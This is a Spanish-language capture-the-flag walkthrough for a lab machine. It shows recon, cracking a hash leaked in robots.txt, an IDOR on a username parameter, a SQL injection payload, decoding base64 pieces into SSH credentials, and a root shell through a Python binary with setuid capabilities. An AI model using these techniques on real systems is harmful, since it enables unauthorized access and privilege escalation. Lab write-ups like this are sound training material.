## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web nos dan la bienvenida al CTF diciéndonos que para encontrar las credenciales SSH hay que juntar 4 piezas.

Hay un login pero no es vulnerable a SQLI. Pero en el escaneo de Nmap revela un robots.txt. Inspeccionando el archivo, hasta abajo tiene un mensaje:

```bash
# Oye paco, te dejo hasheada aquí tu contraseña, guardala bien para que no tengas que estar preguntando todo el rato.
# 25c09c85575db0e238c4ac35783cc43c

# Pieza 1: RW5ob3JhYnVlbmEhIEhhcyBjb21wbGV0YWRvIGVzdGUg
```

Tenemos la primera pieza.

Utilizo Crackstation para descifrar el hash y encuentro:

```bash
rompecabezas
```

Entro con las credenciales de Paco y tenemos un dashboard que simula una gestión de un servidor.

Al entrar al menú de ajustes de usuario veo que almacena usuarios por un parámetro en la URL:

```bash
?username=paco
```

Lo cual es indicio a una vulnerabilidad IDOR (Insecure Direct Object Reference).

Probando con el usuario admin es posible acceder al panel de admin.

```bash
?username=admin
```

Dentro tenemos la pieza 2:

```bash
cHV6bGUgeSBwb3IgdGFudG8gc2UgdGUgb3RvcmdhbiBs
```

En la página hay un acertijo que hay que resolver. No lo pondré pero hay palabras clave para en el texto:

```bash
Consulta
Sintáxis
Lógica
Interpretación 
```

Por lo que deduzco que es “Inyección SQL”.

Consiguiendo así la tercera pieza:

```bash
YXMgbGxhdmVzIGRlbCByZWlubzoKClB5dGgwbksxZDpV
```

Debajo hay un filtro que parece que busca algo, por la respuesta del acertijo parece que toca hacer una Inyección SQL.

Después de un rato intentando doy con la correcta:

```bash
') or 1=1-- -
```

Revelando así la 4ta pieza:

```bash
QiNmY0VwSzI2ZzkrISMqQz85Y1dENjVoYnQjZUcKCg==
```

Ya tengo todas las piezas. Por como termina la 4ta veo que está en base64, así que de manera local la decodifico:

```bash
echo "RW5ob3JhYnVlbmEhIEhhcyBjb21wbGV0YWRvIGVzdGUgcHV6bGUgeSBwb3IgdGFudG8gc2UgdGUgb3RvcmdhbiBsYXMgbGxhdmVzIGRlbCByZWlubzoKClB5dGgwbksxZDpVQiNmY0VwSzI2ZzkrISMqQz85Y1dENjVoYnQjZUcKCg==" ! base64 -d
```

Info:

```bash
Enhorabuena! Has completado este puzzle y por tanto se te otorgan las llaves del reino:

Pyth0nK1d:UB#fcEpK26g9+!#*C?9cWD65hbt#eG
```

Y entro por SSH.

## Escalada

Listando SUID encuentro:

```bash
find / -perm -4000 2>/dev/null
# Info:
/usr/sbin/exim4
```

Es un sistema de mail en formato CLI, investigando no encuentro nada útil.

Pruebo listando capacidades con Getcap:

```bash
getcap -r / 2>/dev/null
# Info:
/usr/local/python3
```

Gracias GTFO Bins:

```bash
/usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Listo.
